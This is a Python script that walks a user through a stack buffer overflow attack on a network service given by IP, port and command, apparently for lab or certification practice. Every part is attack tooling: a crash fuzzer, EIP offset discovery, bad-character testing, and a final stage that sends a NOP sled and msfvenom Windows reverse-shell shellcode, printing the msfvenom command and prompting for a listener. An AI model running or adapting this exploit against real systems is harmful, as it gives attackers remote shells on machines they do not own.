#!/usr/bin/env python3

import pwnlib.util.cyclic
import socket, time, sys
import argparse

parser = argparse.ArgumentParser()

parser.add_argument(
    "--ip",
    "-i",
    help="IP address of vuln server.",
)

parser.add_argument(
    "--port",
    "-p",
    help="Port of vuln server.",
)

parser.add_argument(
    "--command",
    "-x",
    help="Command to send to vuln server.",
)

def send_payload(ip, port, buffer):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
      s.connect((ip, int(port)))
      print("Sending evil buffer...")
      s.send(bytes(buffer + "\r\n", "latin-1"))
      print("Done!")
    except:
      print("Could not connect.")

def fuzzer(ip, port, command):
    timeout = 5
    prefix =  command + " "

    string = prefix + "A" * 100

    while True:
      try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
          s.settimeout(timeout)
          s.connect((ip, int(port)))
          s.recv(1024)
          print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
          s.send(bytes(string, "latin-1"))
          s.recv(1024)
      except:
        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
        return (len(string)-len(prefix))

      string += 100 * "A"
      time.sleep(1)

def check_eip_offset(ip, port, command, pattern):
    prefix = command + " "
    payload = pattern
    offset= 0
    overflow= "A" * offset
    retn = ""
    padding = ""
    postfix = ""

    buffer = prefix + overflow + retn + padding + payload + postfix

    send_payload(ip, port, buffer)

    eip = int(input("Enter EIP register: "), base=16)
    eip_offset = pwnlib.util.cyclic.cyclic_metasploit_find(eip)
    print("The EIP offset is at:", eip_offset)

    answer=input("Please restart the program and then type Y to continue: ")
    if answer=="Y":
        offset = eip_offset
        retn = "BBBB"
        overflow = "A" * offset
        padding = ""
        postfix = ""
        payload = ""

        buffer = prefix + overflow + retn + padding + payload + postfix

        send_payload(ip, port, buffer)

        print("If EIP is showing 42424242, we were successfully able to write into EIP register!")

        return offset

def find_badchar(ip, port, command, eip_offset):

    bad_chars = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

    print("Generate a bad char bytearray by doing !mona bytearray -b \"\\x00\"")
    answer = input("Restart program again for bad char checking: ")

    if answer == "Y":

        prefix = command + " "
        payload = bad_chars
        offset = eip_offset
        overflow= "A" * offset
        retn = "BBBB"

        padding = ""
        postfix = ""

        buffer = prefix + overflow + retn + padding + payload.decode('latin-1') + postfix
        send_payload(ip, port, buffer)

        print("Check for bad characters using !mona compare -f <path to bytearray.bin> -a <address>")

        badchar_len = int(input("Enter how many bad chars were found: "))
        badchar_list = ["00"]

        for i in range(0, badchar_len):
            print("Please restart program again and generate a new bytearray. Include the character to remove")
            remove = input("Enter character to remove: ")
            badchar_list.append(remove)

            print("List of bad chars that have been removed: ", " ".join(badchar_list))

            payload = payload.replace(bytes.fromhex(remove), bytes.fromhex(""))

            buffer = prefix + overflow + retn + padding + payload.decode('latin-1') + postfix
            send_payload(ip, port, buffer)

            answer = input("Are bad characters gone [Y/N]: ")

            if answer == "Y":
                print("List of bad characters: ", " ".join(badchar_list))
                return badchar_list
                break
            if answer == "N":
                continue


def exploit(ip, port, command, eip_offset, badchars):
    prefix = f"{command} "
    offset = eip_offset
    overflow = "A" * offset
    padding = "\x90" * 16
    postfix = ""

    print("First, let's find a jump point by using !mona jmp -r esp -cpb <bad chars>.")
    retn=input("Type in jump point (Little endian): ")

    print("Now let's generate the payload but first we'll need some info.")
    lhost=input("Enter your IP address (on VPN): ")
    lport=input("Enter your listening port: ")
    print("On another terminal, use this command to generate the payload: ")

    new_badchars = ["\\x"+item for item in badchars]
    print("msfvenom -p windows/reverse_shell_tcp "+"LHOST="+lhost+" LPORT="+lport+" EXITFUNC=thread -b \""+"".join(new_badchars)+"\" -f c")

    print("Enter your payload")

    chars_format = ['\n', '"', '\\x']
    payload = sys.stdin.read()

    for char in chars_format:
        if char in payload:
            payload = payload.replace(char, "")

    buffer = bytes(prefix, "latin-1") + bytes(overflow, "latin-1") + bytes.fromhex(retn) + bytes(padding, "latin-1") + bytes.fromhex(payload) + bytes(postfix, "latin-1")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    answer = input("\nSet up a netcat listener for your payload now (Y to continue): ")

    if answer == "Y":
        try:
          s.connect((ip, int(port)))
          print("Sending evil buffer...")
          s.send(buffer)
          print("Done!")
        except:
          print("Could not connect.")

        print("Check if you got a revere shell call back!")

def main(args):
    print(f"Running fuzzer on {args.ip}:{args.port}")
    crashed = fuzzer(args.ip, args.port, args.command)

    cyclic_pattern = pwnlib.util.cyclic.cyclic_metasploit(crashed).decode("ascii")

    answer=input("Please restart the program and then type Y to continue: ")
    if answer=="Y":
        offset = check_eip_offset(args.ip, args.port, args.command, cyclic_pattern)
        badchar_list = find_badchar(args.ip, args.port, args.command, offset)
        exploit(args.ip, args.port, args.command, offset, badchar_list)


if __name__ == "__main__":
    main(parser.parse_args())
